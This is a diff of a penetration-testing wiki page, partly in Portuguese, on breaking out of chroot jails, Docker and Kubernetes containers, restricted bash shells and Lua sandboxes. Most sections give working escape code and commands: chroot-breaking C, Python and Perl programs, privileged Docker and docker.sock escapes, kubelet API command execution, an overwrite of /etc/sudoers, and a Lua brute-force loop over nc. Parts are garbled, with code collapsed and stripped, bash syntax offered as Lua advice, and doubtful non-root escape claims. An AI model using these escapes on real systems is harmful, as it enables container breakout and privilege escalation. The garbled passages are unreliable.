@@ -1,3 +1,5 @@
+# Escaping from Jails
+
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -26,14 +28,12 @@ int main(int argc, char **argv) {
 }
 ```
 
-</details>
-
 ```bash
 gcc break_chroot.c -o break_chroot
 ./break_chroot /new_chroot
 ```
 
-### Root + Mount
+#### Root + Mount
 
 If you are **root** inside a chroot you **can escape** creating a **mount**. This because **mounts are not affected** by chroot.
 
@@ -43,7 +43,7 @@ mount --bind / /tmp/new_root
 chroot /tmp/new_root
 ```
 
-### User + CWD
+#### User + CWD
 
 If you are **not root** inside a chroot you **can escape** creating a **new chroot** with a **new user**. This because **chroot doesn't affect** the **user**.
 
@@ -54,7 +54,7 @@ chroot /tmp/new_chroot /bin/bash
 su new_user
 ```
 
-### User + Mount
+#### User + Mount
 
 If you are **not root** inside a chroot you **can escape** creating a **mount**. This because **mounts are not affected** by chroot.
 
@@ -65,17 +65,17 @@ chroot /tmp/new_root
 su new_user
 ```
 
-## Docker Escapes
+### Docker Escapes
 
-### Docker Breakouts
+#### Docker Breakouts
 
-From [wikipedia](https://en.wikipedia.org/wiki/Docker_(software)#Security): Docker's default configuration relies on the host kernel for container isolation and security. By default, Docker containers share the host system's filesystem and network interface(s), but can be further restricted with the `--read-only` and `--net=none` flags. Linux capabilities and seccomp filters can be used to control the container's access to the host system.
+From [wikipedia](https://en.wikipedia.org/wiki/Docker\_\(software\)#Security): Docker's default configuration relies on the host kernel for container isolation and security. By default, Docker containers share the host system's filesystem and network interface(s), but can be further restricted with the `--read-only` and `--net=none` flags. Linux capabilities and seccomp filters can be used to control the container's access to the host system.
 
 {% hint style="success" %}
 The **tool** [**Docker Escape**](https://github.com/KrustyHack/docker-escape) was created to automate the following escenarios and scape from `Docker`.
 {% endhint %}
 
-### Docker Breakout via Build
+#### Docker Breakout via Build
 
 If you can **build a Docker image** you can **escape** from it.
 
@@ -93,7 +93,7 @@ docker run -it --privileged escape
 ./docker_escape
 ```
 
-### Docker Breakout via Run
+#### Docker Breakout via Run
 
 If you can **run a Docker container** you can **escape** from it.
 
@@ -101,7 +101,7 @@ If you can **run a Docker container** you can **escape** from it.
 docker run -it --rm --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
 ```
 
-### Docker Breakout via Volume
+#### Docker Breakout via Volume
 
 If you can **mount a volume** you can **escape** from it.
 
@@ -109,7 +109,7 @@ If you can **mount a volume** you can **escape** from it.
 docker run -it --rm -v /:/mnt alpine chroot /mnt sh
 ```
 
-### Docker Breakout via Environment Variables
+#### Docker Breakout via Environment Variables
 
 If you can **set environment variables** you can **escape** from it.
 
@@ -117,7 +117,7 @@ If you can **set environment variables** you can **escape** from it.
 docker run -it --rm -e LD_PRELOAD=/tmp/lib.so alpine sh
 ```
 
-### Docker Breakout via Docker Socket
+#### Docker Breakout via Docker Socket
 
 If you can **access the Docker socket** you can **escape** from it.
 
@@ -125,9 +125,9 @@ If you can **access the Docker socket** you can **escape** from it.
 docker run -it --rm -v /var/run/docker.sock:/var/run/docker.sock alpine docker -H unix:///var/run/docker.sock run -v /:/mnt -it alpine chroot /mnt sh
 ```
 
-## Kubernetes Escapes
+### Kubernetes Escapes
 
-### Kubernetes Breakouts
+#### Kubernetes Breakouts
 
 From [wikipedia](https://en.wikipedia.org/wiki/Kubernetes#Security): Kubernetes provides various security features to protect the master node(s) and the nodes. The API server component provides authentication and authorization mechanisms, such as client certificates, bearer tokens, and Kubernetes Role-Based Access Control (RBAC). The kubelet component provides node-level authentication and authorization using x509 certificates and a small set of built-in roles.
 
@@ -135,7 +135,7 @@ From [wikipedia](https://en.wikipedia.org/wiki/Kubernetes#Security): Kubernetes 
 The **tool** [**Kubeletctl**](https://github.com/cyberark/kubeletctl) was created to automate the following escenarios and scape from `Kubernetes`.
 {% endhint %}
 
-### Kubernetes Breakout via Pod
+#### Kubernetes Breakout via Pod
 
 If you can **create a pod** you can **escape** from it.
 
@@ -160,7 +160,7 @@ kubectl apply -f breakout.yaml
 kubectl exec -it breakout sh
 ```
 
-### Kubernetes Breakout via Service Account Token
+#### Kubernetes Breakout via Service Account Token
 
 If you can **access a service account token** you can **escape** from it.
 
@@ -169,13 +169,14 @@ TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
 curl -H "Authorization: Bearer $TOKEN" https://kubernetes/api/v1/namespaces/default/pods
 ```
 
-### Kubernetes Breakout via Kubelet API
+#### Kubernetes Breakout via Kubelet API
 
 If you can **access the kubelet API** you can **escape** from it.
 
 ```bash
 curl -k https://kubelet:10250/run/default/breakout -XPOST -d 'cmd=sh&cmd=-c&cmd=mount%20--bind%20/%20/mnt;%20chroot%20/mnt%20sh'
 ```
+
 ```c
 #include <sys/stat.h>
 #include <stdlib.h>
@@ -194,7 +195,6 @@ int main(void)
     system("/bin/bash");
 }
 ```
-</details>
 
 <details>
 
@@ -203,17 +203,8 @@ int main(void)
 Python
 
 </details>
-```python
-#!/usr/bin/python
-import os
-os.mkdir("chroot-dir")
-os.chroot("chroot-dir")
-for i in range(1000):
-    os.chdir("..")
-os.chroot(".")
-os.system("/bin/bash")
-```
-</details>
+
+\`\`\`python #!/usr/bin/python import os os.mkdir("chroot-dir") os.chroot("chroot-dir") for i in range(1000): os.chdir("..") os.chroot(".") os.system("/bin/bash") \`\`\`
 
 <details>
 
@@ -264,6 +255,7 @@ while (<SHELL>) {
 ```
 
 Este código lê a saída do shell interativo linha por linha usando a função `readline()` e a imprime na tela usando a função `print()`.
+
 ```perl
 #!/usr/bin/perl
 mkdir "chroot-dir";
@@ -274,9 +266,10 @@ foreach my $i (0..1000) {
 chroot ".";
 system("/bin/bash");
 ```
+
 </details>
 
-### Root + FD salvo
+#### Root + FD salvo
 
 {% hint style="warning" %}
 Este caso é semelhante ao anterior, mas neste caso o **atacante armazena um descritor de arquivo para o diretório atual** e, em seguida, **cria o chroot em uma nova pasta**. Finalmente, como ele tem **acesso** a esse **FD fora** do chroot, ele o acessa e **escapa**.
@@ -285,31 +278,21 @@ Este caso é semelhante ao anterior, mas neste caso o **atacante armazena um des
 <details>
 
 <summary>C: break_chroot.c</summary>
-```c
-#include <sys/stat.h>
-#include <stdlib.h>
-#include <unistd.h>
 
-//gcc break_chroot.c -o break_chroot
+\`\`\`c #include #include #include
 
-int main(void)
-{
-    mkdir("tmpdir", 0755);
-    dir_fd = open(".", O_RDONLY);
-    if(chroot("tmpdir")){
-        perror("chroot");
-    }
-    fchdir(dir_fd);
-    close(dir_fd);  
-    for(x = 0; x < 1000; x++) chdir("..");
-    chroot(".");
-}
-```
+//gcc break\_chroot.c -o break\_chroot
+
+int main(void) { mkdir("tmpdir", 0755); dir\_fd = open(".", O\_RDONLY); if(chroot("tmpdir")){ perror("chroot"); } fchdir(dir\_fd); close(dir\_fd);\
+for(x = 0; x < 1000; x++) chdir(".."); chroot("."); }
+
+````
 </details>
 
 ### Root + Fork + UDS (Unix Domain Sockets)
 
-{% hint style="warning" %}
+<div data-gb-custom-block data-tag="hint" data-style='warning'>
+
 FD pode ser passado por Unix Domain Sockets, então:
 
 * Crie um processo filho (fork)
@@ -318,39 +301,48 @@ FD pode ser passado por Unix Domain Sockets, então:
 * No processo pai, crie um FD de uma pasta que está fora do novo chroot do processo filho
 * Passe para o processo filho esse FD usando o UDS
 * O processo filho muda para o diretório desse FD e, como está fora do chroot, ele escapará da prisão
-{% endhint %}
+
+</div>
 
 ### &#x20;Root + Mount
 
-{% hint style="warning" %}
+<div data-gb-custom-block data-tag="hint" data-style='warning'>
+
 * Montando o dispositivo raiz (/) em um diretório dentro do chroot
 * Executando chroot nesse diretório
 
 Isso é possível no Linux
-{% endhint %}
+
+</div>
 
 ### Root + /proc
 
-{% hint style="warning" %}
+<div data-gb-custom-block data-tag="hint" data-style='warning'>
+
 * Monte o procfs em um diretório dentro do chroot (se ainda não estiver)
 * Procure um pid que tenha uma entrada de raiz/cwd diferente, como: /proc/1/root
 * Chroot nessa entrada
-{% endhint %}
+
+</div>
 
 ### Root(?) + Fork
 
-{% hint style="warning" %}
+<div data-gb-custom-block data-tag="hint" data-style='warning'>
+
 * Crie um Fork (processo filho) e chroot em uma pasta diferente mais profunda no FS e CD nela
 * Do processo pai, mova a pasta onde o processo filho está para uma pasta anterior ao chroot dos filhos
 * Esse processo filho se encontrará fora do chroot
-{% endhint %}
+
+</div>
 
 ### ptrace
 
-{% hint style="warning" %}
+<div data-gb-custom-block data-tag="hint" data-style='warning'>
+
 * Há algum tempo, os usuários podiam depurar seus próprios processos a partir de um processo próprio ... mas isso não é mais possível por padrão
 * De qualquer forma, se for possível, você pode ptrace em um processo e executar um shellcode dentro dele ([veja este exemplo](linux-capabilities.md#cap\_sys\_ptrace)).
-{% endhint %}
+
+</div>
 
 ## Bash Jails
 
@@ -363,83 +355,92 @@ echo $PATH
 env
 export
 pwd
-```
-### Modificar PATH
+````
+
+#### Modificar PATH
 
 Verifique se é possível modificar a variável de ambiente PATH.
+
 ```bash
 echo $PATH #See the path of the executables that you can use
 PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
 echo /home/* #List directory
 ```
-### Usando o vim
+
+#### Usando o vim
+
 ```bash
 :set shell=/bin/sh
 :shell
 ```
-### Criar script
+
+#### Criar script
 
 Verifique se você pode criar um arquivo executável com _/bin/bash_ como conteúdo.
+
 ```bash
 red /bin/bash
 > w wx/path #Write /bin/bash in a writable and executable path
 ```
-### Obter bash a partir do SSH
+
+#### Obter bash a partir do SSH
 
 Se você estiver acessando via ssh, pode usar este truque para executar um shell bash:
+
 ```bash
 ssh -t user@<IP> bash # Get directly an interactive shell
 ssh user@<IP> -t "bash --noprofile -i"
 ssh user@<IP> -t "() { :; }; sh -i "
 ```
-### Declaração
+
+#### Declaração
+
 ```bash
 declare -n PATH; export PATH=/bin;bash -i
  
 BASH_CMDS[shell]=/bin/bash;shell -i
 ```
-### Wget
+
+#### Wget
 
 Você pode sobrescrever, por exemplo, o arquivo sudoers.
+
 ```bash
 wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
 ```
-### Outros truques
+
+#### Outros truques
 
 [**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
 [https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
 [https://gtfobins.github.io](https://gtfobins.github.io/)\
 **Também pode ser interessante a página:**
 
-{% content-ref url="../useful-linux-commands/bypass-bash-restrictions.md" %}
-[bypass-bash-restrictions.md](../useful-linux-commands/bypass-bash-restrictions.md)
-{% endcontent-ref %}
-
-## Jaulas Python
+### Jaulas Python
 
 Truques sobre como escapar de jaulas Python na seguinte página:
 
-{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
-[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
-{% endcontent-ref %}
-
-## Jaulas Lua
+### Jaulas Lua
 
 Nesta página, você pode encontrar as funções globais às quais você tem acesso dentro do Lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)
 
 **Avaliação com execução de comando:**
+
 ```bash
 load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
 ```
+
 Algumas dicas para **chamar funções de uma biblioteca sem usar pontos**:
 
-- Use a função `declare` para criar uma referência para a biblioteca: `declare -a lib=(/lib/x86_64-linux-gnu/libc.so.6)`
-- Chame a função desejada usando a sintaxe `${lib[nome_da_funcao]}`: `${lib[system]}('ls')`
+* Use a função `declare` para criar uma referência para a biblioteca: `declare -a lib=(/lib/x86_64-linux-gnu/libc.so.6)`
+* Chame a função desejada usando a sintaxe `${lib[nome_da_funcao]}`: `${lib[system]}('ls')`
+
 ```bash
 print(string.char(0x41, 0x42))
 print(rawget(string, "char")(0x41, 0x42))
 ```
-# Enumerar funções de uma biblioteca:
+
+## Enumerar funções de uma biblioteca:
 
 Para enumerar as funções de uma biblioteca, podemos usar a ferramenta `nm`. O `nm` lista os símbolos (incluindo as funções) de um arquivo objeto ou de uma biblioteca compartilhada.
 
@@ -454,10 +455,13 @@ Onde `/path/to/library.so` é o caminho para a biblioteca que você deseja lista
 O parâmetro `-g` lista apenas os símbolos globais (ou seja, as funções que podem ser acessadas por outros arquivos) e o parâmetro `-C` desmangle os nomes das funções (ou seja, converte os nomes das funções de sua forma codificada para sua forma legível por humanos).
 
 O resultado será uma lista de todas as funções na biblioteca, juntamente com seus endereços na memória.
+
 ```bash
 for k,v in pairs(string) do print(k,v) end
 ```
+
 Observe que toda vez que você executa o comando anterior em um **ambiente lua diferente, a ordem das funções muda**. Portanto, se você precisar executar uma função específica, pode realizar um ataque de força bruta carregando diferentes ambientes lua e chamando a primeira função da biblioteca "le":
+
 ```bash
 #In this scenario you could BF the victim that is generating a new lua environment 
 #for every interaction with the following line and when you are lucky
@@ -468,22 +472,17 @@ for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end
 #and "char" from string library, and the use both to execute a command
 for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
 ```
+
 **Obter shell lua interativa**: Se você estiver dentro de uma shell lua limitada, poderá obter uma nova shell lua (e, esperançosamente, ilimitada) chamando:
+
 ```bash
 debug.debug()
 ```
-## Referências
+
+### Referências
 
 * [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slides: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))
 
-<details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
-
-* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
